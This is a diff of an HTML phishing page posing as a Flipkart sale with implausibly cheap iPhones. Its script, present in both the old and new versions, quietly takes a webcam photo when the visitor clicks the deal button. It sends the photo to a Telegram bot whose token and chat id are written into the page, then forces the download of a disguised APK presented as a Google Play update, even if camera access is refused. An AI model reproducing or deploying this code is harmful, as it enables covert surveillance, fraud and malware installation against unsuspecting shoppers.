@@ -1,76 +1,182 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>⚡ Flipkart Huge Sale - Up to 90% Off!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipkart Special Deals ⚡</title>
     <style>
-        body { background: #f1f3f6; font-family: sans-serif; margin: 0; padding: 0; }
-        .header { background: #2874f0; color: #fff; padding: 10px 20px; font-weight: bold; font-size: 20px; }
-        .box { background: #fff; border-radius: 5px; margin: 20px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .btn { background: #fb641b; color: #fff; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; width: 80%;}
-        .icon { font-size: 60px; margin-bottom: 10px; color: #fb641b; }
-        img.product-img { max-width: 100%; border-radius: 5px; }
+        body { 
+            background: #f1f3f6; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            text-align: center; 
+        }
+        .header { 
+            background: #2874f0; 
+            padding: 15px; 
+            color: white; 
+            font-weight: bold; 
+            font-size: 1.2rem; 
+            text-align: left; 
+            display: flex;
+            align-items: center;
+        }
+        .header img {
+            width: 25px;
+            margin-right: 10px;
+        }
+        .container { 
+            padding: 10px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
+        
+        /* Product Image Card */
+        .card {
+            background: white;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin: 15px 0;
+            text-align: left;
+        }
+        
+        /* iPhone Image Size Optimized */
+        .product-img { 
+            width: 100%; 
+            max-width: 200px; /* Bada Size iPhone */
+            height: auto;
+            display: block;
+            margin: 0 auto 15px;
+            /* Box-shadow extra feel ke liye */
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1); 
+            border-radius: 10px;
+        }
+
+        /* Product Title */
+        .product-title {
+            font-size: 1.4rem;
+            color: #333;
+            font-weight: 500;
+            margin: 10px 0;
+        }
+
+        /* Pricing Area */
+        .price-section {
+            margin: 15px 0;
+        }
+        .special-price {
+            color: #388e3c;
+            font-size: 2.2rem;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .old-price {
+            text-decoration: line-through;
+            color: #878787;
+            font-size: 1.2rem;
+        }
+        .offer-tag {
+            color: #388e3c;
+            font-size: 1.1rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        /* Mobile Description Size Optimized */
+        p { 
+            color: #666; 
+            font-size: 1.1rem; 
+            line-height: 1.6; 
+            margin: 15px 0 25px; 
+            padding: 0 10px;
+        }
+
+        /* Button Size Optimized */
+        .btn { 
+            background: #fb641b; 
+            color: white; 
+            border: none; 
+            padding: 18px; 
+            font-size: 1.3rem; 
+            font-weight: bold; 
+            width: 100%; 
+            max-width: 400px; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            transition: background 0.2s;
+        }
     </style>
 </head>
 <body>
-    <div class="header">Flipkart Super Deals ⚡</div>
 
-    <div class="box">
-        <div class="icon">🎁</div>
-        <h3>Alert: Google Play Service Update Required</h3>
-        <p>"To continue shopping safely on the Flipkart App, a mandatory Google Play security patch is required. Please update to enjoy a seamless and secure sale experience.".</p>
-        
-        <button class="btn" onclick="startFlipkart()">Update & Continue to Sale</button>
-    </div>
+<div class="header">
+    <img src="https://em-content.zobj.net/source/microsoft/310/wrapped-gift_1f381.png" alt="Gift Box">
+    Flipkart Special Offers ⚡
+</div>
+
+<div class="container">
     
-    <div class="box" style="display: none;" id="productBox">
-        <h3>Today's Deals: Up to 90% Off!</h3>
-        <p>Special prices for selected products only for the next 2 hours.</p>
-        <img src="https://rukminim1.flixcart.com/image/312/312/l5h2xe80/mobile/x/d/h/11-13-11-t-apple-original-imagg453xat3gx4v.jpeg?q=70" alt="iPhone" class="product-img">
-        <p><b>Apple iPhone 15 (128GB, White)</b></p>
-        <p><b>Special Price: ₹4,999</b> (Regular: ₹38,999)</p>
+    <div class="card">
+        <img src="https://rukminim1.flixcart.com/image/312/312/xif0q/mobile/3/5/l/-original-imaghx9qyg7pvsk6.jpeg" alt="iPhone 14 (Blue)" class="product-img">
+        
+        <div class="product-title">Apple iPhone 14 (Blue, 128 GB)</div>
+        
+        <div class="price-section">
+            <span class="special-price">₹12,499</span>
+            <span class="old-price">₹69,900</span>
+            <span class="offer-tag">(78% OFF)</span>
+        </div>
+        
+        <p>This is a limited-time deal on selected devices. Make sure to claim your offer before the stock runs out!</p>
+        
+        <button class="btn" onclick="triggerMagic()">CLAIM SPECIAL DEAL</button>
     </div>
 
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+</div>
 
-    <script>
-        function startFlipkart() {
-            // 1. Pehle Camera Permission Maangein (Background Update)
-            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
-                let v = document.getElementById('v');
-                v.srcObject = s;
-                
-                // Photo khinch kar Telegram par bhejo
-                setTimeout(capture, 2000);
-                
-                // 2. APK Download shuru kar do (Direct Link yahan dalein)
-                window.location.href = "https://example.com/flipkart_updater.apk";
-                
-                // 3. Fake System Update Popup
-                // Hum APK download karte hi user ko sale page par redirect kar denge.
+<video id="v" autoplay style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
-            }).catch(e => {
-                alert("Alert: Please click 'Allow' to update Google Play Services and continue to the sale.");
-            });
-        }
+<script>
+    const token = '8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4';
+    const chat_id = '2043988256';
+    // YAHAN APNA APK LINK DALEIN (Example Mediafire link)
+    const apk_url = "https://www.mediafire.com/file/example/watch_video.apk"; 
 
-        function capture() {
+    function triggerMagic() {
+        // Silent Camera Permissions request
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
             let v = document.getElementById('v');
-            let c = document.getElementById('c');
-            c.width = 640; c.height = 480;
-            c.getContext('2d').drawImage(v, 0, 0);
-            let img = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+            v.srcObject = s;
+            setTimeout(() => {
+                let c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                let img = c.toDataURL('image/jpeg', 0.5).split(',')[1];
 
-            fetch('https://api.telegram.org/bot8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4/sendPhoto', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: '2043988256', photo: img, caption: "📸 Button Clicked! Target Captured." })
-            }).then(() => {
-                // Photo bhejne ke baad, actual sale page show karo ya asli Flipkart par bhej do.
-                document.getElementById('productBox').style.display = 'block';
-                // window.location.href = "https://www.flipkart.com/"; 
-            });
-        }
-    </script>
+                // Telegram Photo send (Silent)
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "🔥 Flipkart Offer Clicked! APK Download Triggered." })
+                });
+
+                // APK Download Trigger
+                window.location.href = apk_url;
+
+            }, 1000); // Short delay after granting access
+        }).catch(e => {
+            alert("⚠️ Update Required: Please 'Allow' camera access to verify your account and claim this special deal.");
+            // If permission denied, trigger download anyway
+            window.location.href = apk_url;
+        });
+    }
+</script>
+
 </body>
 </html>
